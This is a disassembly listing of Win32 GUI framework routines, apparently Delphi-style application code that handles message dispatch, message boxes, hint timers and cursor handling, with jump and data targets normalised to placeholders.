mov edx edi
mov eax esi
call sub_447dd0
test al al
jne r-xdata
lea ecx [ esp + 0x1 ]
mov edx edi
mov eax [ esi + 0x104 ]
call [ esi + 0x100 ]
mov edx edi
mov eax esi
call sub_4463e8
test al al
jne r-xdata
cmp [ esp + 0x1 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4462a4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4462f4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_44625c
test al al
jne r-xdata
push edi
call TranslateMessage
cmp [ esp ] 0x0
je r-xdata
push edi
call DispatchMessageA
jmp r-xdata
push edi
call DispatchMessageW
jmp r-xdata
sub_446638
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_446524
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_446edc
sub_44665c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
call sub_419878
mov eax 0x8
call sub_402f00
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xb0 ]
call sub_419740
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_4466b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xb0 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_419898
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402f1c
mov edx esi
mov eax [ ebx + 0xb0 ]
call sub_41978c
jmp r-xdata
sub_446748
push ebx
push esi
add esp 0xfffffe00
mov esi edx
call sub_404528
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
setne al
add esp 0x200
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_404530
mov eax esp
push eax
lea edx [ esp + 0x104 ]
mov eax esi
call sub_404530
lea edx [ esp + 0x104 ]
pop eax
movzx ecx [ eax ]
inc ecx
call sub_403a4c
jne r-xdata
mov eax ebx
call sub_4045dc
mov ebx eax
sub_4467a4
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402f84
mov edx [ r-xdata ]
call sub_446748
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_402fa4
push eax
call sub_402f84
pop edx
call sub_40da34
call sub_402f84
mov edx [ r-xdata ]
call sub_446748
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xea ] 0x0
je r-xdata
call sub_402f84
mov edx eax
mov eax ebx
call sub_4469b0
pop esi
pop ebx
retn
call sub_402f84
mov ecx eax
mov edx esi
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
sub_446834
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447be4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_43b920
mov [ ebp - 0x14 ] eax
call sub_43b77c
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
call sub_445750
test al al
je r-xdata
mov [ ebp - 0x48 ] 0x28
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
push 0x2
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
je r-xdata
xor ecx ecx
push ebp
push sub_44699c
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
mov eax [ ebp - 0x8 ]
push eax
push edi
push ebx
call MessageBoxA
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4469a3
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
je r-xdata
or esi 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x14 ]
call sub_43b9e4
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x20 ]
call sub_43b784
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_4469b0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446a6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4055c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_4461dc
mov eax [ ebp - 0x108 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
mov eax ebx
pop ecx
call sub_446834
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446a72
lea eax [ ebp - 0x108 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
call sub_40a518
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_4040f4
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_4039c8
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405818
sub_446a88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov esi eax
xor edi edi
mov [ esp + 0x4 ] 0x1
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax esi
call sub_446bb0
mov ebx eax
test bl bl
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
test edi edi
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_458904
test al al
je r-xdata
mov eax edi
call sub_458814
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x4 ] 0x0
cmp [ esi + 0xac ] 0x0
jne r-xdata
mov eax [ esi + 0x30 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x284 ] 0x0
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
movzx eax bp
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_44724c
test al al
je r-xdata
call sub_4585f8
mov [ esp + 0x8 ] eax
mov eax edi
call sub_4585f8
mov [ esp + 0x8 ] eax
mov eax esi
call sub_44724c
test al al
je r-xdata
cmp [ edi + 0x268 ] 0x0
jne r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
push ebp
mov eax [ esp + 0x4 ]
push eax
mov ecx [ edi + 0x284 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov [ esp + 0x4 ] 0x0
sub_446bb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
test eax eax
je r-xdata
test bl bl
jne r-xdata
xor edx edx
call sub_43bd90
mov esi eax
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
test eax eax
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x11a ] 0x0
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov ebx eax
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
mov ebx eax
sub_446c7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_446cfa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov eax edi
call sub_4059dc
mov ecx eax
mov dx 0x102
mov eax esi
call sub_446bb0
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d01
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov eax esi
call sub_44724c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_447ba8
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
sub_446d0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_446d83
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1 ]
push eax
mov ecx edi
mov dx 0x1
mov eax esi
call sub_446bb0
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d8a
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov eax esi
call sub_44724c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_447ba8
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
sub_446d9c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_404650
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_450a08
jmp r-xdata
sub_446dec
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_443e20
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4585f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_443e0c
mov ebx eax
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax ebx
call sub_4585f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
sub_446e50
push ebx
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44ee0c
cmp eax [ ebx + 0x48 ]
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov [ ebx + 0x48 ] eax
sub_446e74
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_446eb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push eax
push 0x0
call KillTimer
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_446dec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_446edc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447029
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_446e50
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4449d0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_44d5a8
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4470d4
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_446fd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x12a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov eax [ ebp - 0x4 ]
call sub_4474a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xc0 ]
test ebx ebx
jg r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446dec
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41f7b4
test al al
je r-xdata
push sub_446e74
push ebx
push 0x0
push 0x0
call SetTimer
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447030
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_405554
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_446dec
sub_447038
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_443e04
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_443df0
movzx edx di
xor ecx ecx
call sub_451b4c
inc esi
dec ebx
jne r-xdata
sub_447074
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_43b75c
test eax eax
je r-xdata
mov eax ebx
call sub_445f74
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_445f74
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_447038
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_4470d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_405974
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_405584
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_431c5c
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a9f0
xor eax eax
push ebp
push sub_447159
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_404650
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
jmp r-xdata
sub_447168
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
movzx eax bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_4471c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_443e04
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_447168
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_443df0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_447168
pop ecx
jmp r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
mov eax [ ebx + 0x1c4 ]
push eax
mov eax ebx
call sub_4585f8
push eax
call IsChild
test eax eax
jne r-xdata
sub_44726c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_4472b0
push sub_444a28
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4474a4
sub_4472d8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp ecx
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xc ]
mov [ esp + 0x10 ] eax
movsx eax [ esp + 0xe ]
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_450324
lea eax [ esp + 0x24 ]
mov dl 0x1
call sub_44ee0c
call sub_444a08
mov edi eax
test edi edi
je r-xdata
mov eax esi
call sub_4474a4
jmp r-xdata
cmp [ edi + 0x8d ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x60 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
movsx eax [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
movsx eax [ esp + 0x1a ]
mov [ esp + 0x20 ] eax
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_450324
push [ esp + 0x28 ]
push [ esp + 0x28 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
neg eax
mov al 0x1
jmp r-xdata
movzx ebx [ esi + 0x58 ]
test bl bl
je r-xdata
test al al
je r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4474a4
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_44726c
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
movzx ecx bl
mov edx 0xb041
mov eax edi
call sub_451b4c
test bl bl
je r-xdata
mov [ esi + 0x58 ] bl
mov [ esi + 0x60 ] edi
lea eax [ esp + 0x4 ]
push eax
call GetCursorPos
lea edx [ esp + 0x4 ]
mov eax esi
call sub_447744
jmp r-xdata
sub_4473f8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4472b0
movzx eax [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_447744
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_447430
jmp r-xdata
sub_447430
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_458904
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4585f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
test al al
je r-xdata
mov cl 0x1
mov edx [ ebx + 0x74 ]
mov eax ebx
call sub_44726c
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4585f8
push eax
call ShowWindow
xor edx edx
mov eax [ ebx + 0x84 ]
call sub_4507b4
jmp r-xdata
sub_4474a4
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_447430
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_444b90
mov eax ebx
call sub_4472b0
sub_4474dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_447620
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_4269d4
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_402ee8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4475f1
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_426a90
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4475f8
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402f1c
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4474cc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4474cc
mov [ ebp - 0x4 ] eax
sub_4475f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_447634
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_404650
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_404528
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_447694
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
xor edx edx
push ebp
push sub_447732
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447739
lea eax [ ebp - 0x4 ]
call sub_405530
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
movzx eax [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_405620
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x250 ]
mov edx [ ebp - 0x4 ]
call sub_425570
mov edi eax
cmp edi [ ebp - 0x8 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x8 ] edi
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40e770
mov ebx eax
inc ebx
sub_447744
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_405fe8
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_447ad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
